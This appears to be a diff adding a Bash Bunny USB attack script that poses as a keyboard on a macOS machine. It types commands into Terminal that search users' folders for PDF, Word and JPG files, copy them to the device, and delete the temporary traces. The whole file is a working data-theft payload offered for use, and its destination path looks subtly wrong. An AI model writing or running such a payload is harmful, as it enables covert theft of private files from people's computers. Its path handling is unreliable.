@@ -1,0 +1,61 @@
+#!/bin/bash
+#
+# Title: macOS File Exfiltration
+# Author: Tukru
+# Description: Exfiltrates specific file types from macOS systems
+#
+# LED SETUP
+# Set TARGET_FILE_TYPES to the file types you want to exfiltrate
+TARGET_FILE_TYPES=("*.pdf" "*.docx" "*.jpg")
+
+# Set the loot folder on the Bash Bunny
+LOOT_DIR="/root/udisk/loot/ExfiltratedFiles"
+
+# Set the temporary folder on the target system
+TEMP_DIR="/tmp/bashbunny"
+
+# Create the loot and temp directories
+mkdir -p "$LOOT_DIR"
+
+# Attack setup
+ATTACKMODE HID STORAGE
+
+# LED ATTACK
+# Wait for the target to recognize the HID device
+sleep 3
+
+# Open a Terminal
+QUACK GUI SPACE
+QUACK DELAY 500
+QUACK STRING "terminal"
+QUACK DELAY 500
+QUACK ENTER
+QUACK DELAY 1000
+
+# Create a temporary directory on the target system
+QUACK STRING "mkdir -p $TEMP_DIR"
+QUACK ENTER
+QUACK DELAY 500
+
+# Search for and copy the target file types to the temporary directory
+for file_type in "${TARGET_FILE_TYPES[@]}"; do
+  QUACK STRING "find /Users -type f -iname '$file_type' -exec cp {} $TEMP_DIR \;"
+  QUACK ENTER
+  QUACK DELAY 500
+done
+
+# Copy the collected files from the temporary directory to the Bash Bunny
+QUACK STRING "cp -R $TEMP_DIR/* /Volumes/BashBunny/$LOOT_DIR"
+QUACK ENTER
+QUACK DELAY 500
+
+# Clean up the temporary directory
+QUACK STRING "rm -rf $TEMP_DIR"
+QUACK ENTER
+QUACK DELAY 500
+
+# Close the Terminal
+QUACK STRING "exit"
+QUACK ENTER
+
+# LED FINISH
